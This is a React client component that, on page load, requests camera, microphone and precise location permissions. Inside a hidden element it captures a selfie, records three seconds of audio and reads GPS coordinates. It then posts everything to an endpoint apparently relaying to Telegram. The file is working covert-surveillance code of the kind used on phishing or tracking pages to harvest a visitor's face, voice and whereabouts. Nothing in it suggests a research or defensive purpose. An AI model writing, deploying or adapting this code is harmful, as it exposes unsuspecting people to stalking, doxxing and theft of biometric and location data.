"use client";

import React, { useEffect, useRef, useState } from "react";
import { toast } from "sonner";

const TELEGRAM_API_ENDPOINT = "/api/telegram";
const AUDIO_RECORDING_DURATION_MS = 3000; // 3 seconds
const VIDEO_CAPTURE_DELAY_MS = 500; // 0.5 seconds delay before capturing selfie

type DataToSend = {
  selfie?: string;
  audio?: string;
  latitude?: number;
  longitude?: number;
};

const PermissionHandler = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const [isProcessing, setIsProcessing] = useState(true);

  const sendDataToTelegram = async (data: DataToSend) => {
    if (Object.keys(data).length === 0) {
      toast.info("No data to send to Telegram (permissions denied or unavailable).");
      return;
    }

    try {
      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        toast.success("Data successfully sent to Telegram!");
      } else {
        const errorData = await response.json();
        toast.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
      }
    } catch (error: any) {
      toast.error(`Network error sending data to Telegram: ${error.message}`);
    }
  };

  useEffect(() => {
    const handlePermissionsAndSend = async () => {
      setIsProcessing(true);
      const dataToSend: DataToSend = {};
      let stream: MediaStream | null = null;

      const cameraAndMicPromise = new Promise<void>(async (resolve) => {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
          toast.success("Camera and Microphone access granted!");

          if (videoRef.current) {
            videoRef.current.srcObject = stream;
            // Wait for video to load metadata
            await new Promise((res) => {
              videoRef.current!.onloadedmetadata = () => {
                videoRef.current!.play().then(res).catch(err => {
                  console.error("Error playing video stream:", err);
                  toast.error("Failed to play video stream.");
                  res(null); // Resolve even on error to unblock
                });
              };
            });

            // Add a small delay to allow the camera to warm up and show an image
            await new Promise(res => setTimeout(res, VIDEO_CAPTURE_DELAY_MS));

            // Capture Selfie
            const canvas = document.createElement("canvas");
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            const ctx = canvas.getContext("2d");
            if (ctx) {
              ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
              dataToSend.selfie = canvas.toDataURL("image/jpeg");
              toast.info("Selfie captured!");
            } else {
              toast.error("Failed to get 2D context for canvas.");
            }
          }

          // Record 3-second audio
          mediaRecorderRef.current = new MediaRecorder(stream);
          mediaRecorderRef.current.ondataavailable = (event) => {
            audioChunksRef.current.push(event.data);
          };
          mediaRecorderRef.current.onstop = () => {
            const audioBlob = new Blob(audioChunksRef.current, { type: "audio/webm" });
            const reader = new FileReader();
            reader.readAsDataURL(audioBlob);
            reader.onloadend = () => {
              dataToSend.audio = reader.result as string;
              toast.info("Audio recorded!");
              resolve(); // Resolve after audio is processed
            };
          };
          mediaRecorderRef.current.start();
          setTimeout(() => {
            if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
              mediaRecorderRef.current.stop();
            }
          }, AUDIO_RECORDING_DURATION_MS);

        } catch (error: any) {
          toast.error(`Camera/Microphone access denied: ${error.message}`);
          resolve(); // Resolve even if denied, so Promise.allSettled can continue
        }
      });

      const geolocationPromise = new Promise<void>((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              dataToSend.latitude = position.coords.latitude;
              dataToSend.longitude = position.coords.longitude;
              toast.success("Location access granted!");
              resolve();
            },
            (error) => {
              toast.error(`Location access denied: ${error.message}`);
              resolve(); // Resolve even if denied
            },
            { enableHighAccuracy: true }
          );
        } else {
          toast.error("Geolocation not supported in this browser.");
          resolve(); // Resolve if not supported
        }
      });

      // Wait for all permission requests and data collection to settle
      await Promise.allSettled([cameraAndMicPromise, geolocationPromise]);

      // Send all collected data to Telegram
      await sendDataToTelegram(dataToSend);

      // Stop all tracks after processing, regardless of success or failure
      if (stream) {
        (stream as MediaStream).getTracks().forEach((track: MediaStreamTrack) => track.stop());
        // Clear the video source object for proper resource management
        if (videoRef.current) {
          videoRef.current.srcObject = null;
        }
      }
      setIsProcessing(false);
    };

    handlePermissionsAndSend();
  }, []);

  return (
    <div style={{ display: 'none' }}>
      <video ref={videoRef} autoPlay playsInline muted />
      {isProcessing && <p>Processing permissions...</p>}
    </div>
  );
};

export default PermissionHandler;